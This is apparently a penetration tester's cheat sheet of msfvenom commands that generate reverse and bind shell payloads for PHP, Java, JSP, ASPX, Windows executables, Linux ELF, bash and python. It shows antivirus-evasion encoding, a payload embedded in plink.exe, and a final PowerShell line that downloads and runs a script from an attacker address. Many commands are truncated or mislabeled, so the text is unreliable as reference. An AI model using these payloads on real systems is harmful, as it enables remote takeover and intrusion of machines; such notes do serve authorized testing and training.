# **msfvenom**

# PHP reverse shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=x.x.x.x  
  
# Java WAR reverse shell  
msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x  
  
# Linux bind shell  
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai  
  
# Linux FreeBSD reverse shell  
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=x.x.x.x  
  
# Linux C reverse shell  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows non staged reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows Staged (Meterpreter) reverse shell  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x  
  
# Windows Python reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows ASP reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows ASPX reverse shell  
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows JavaScript reverse shell with nops  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows Powershell reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows reverse shell excluding bad characters  
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=x.x.x.x  
  
# Windows x64 bit reverse shell  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows reverse shell embedded into plink  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
#JSP  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x  
  
#ASP  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
  
#FTP  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
ProFTPD  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x  
  
  
ORACLE xdb FTP Pass Exploit  
  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
Apache shell war  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x  
  
#ASP  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
#JS  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x  
  
  
#Create a PE Reverse Shell  
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe  
  
#Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai  
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe  
  
#Create a PE reverse shell and embed it into an existing executable  
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe  
  
#Create a PE Reverse HTTPS shell  
msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe  
  
  
#python  
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py  
  
#bash  
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh  
  
#ELF  
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=x.x.x.x  
  
#Linux Based Shellcode  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT= <Your Port to Connect On> -f <language>  
  
#Windows based shellcode  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>  
  
  
#Unix Shell  
msfvenom -p cmd/unix/reverse_bash lhost=x.x.x.x  
  
#wordpress  
msfvenom -p php/meterpreter/reverse_tcp lhost=x.x.x.x  
  
#cron  
msfvenom –p cmd/unix/reverse_bash lhost=x.x.x.x  
  
#bind shell  
msfvenom -p windows/shell_bind_tcp LHOST=x.x.x.x  
  
  
for powershell downloading  
  
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('[http://](http://10.10.14.21/shell.ps1'))x.x.x.x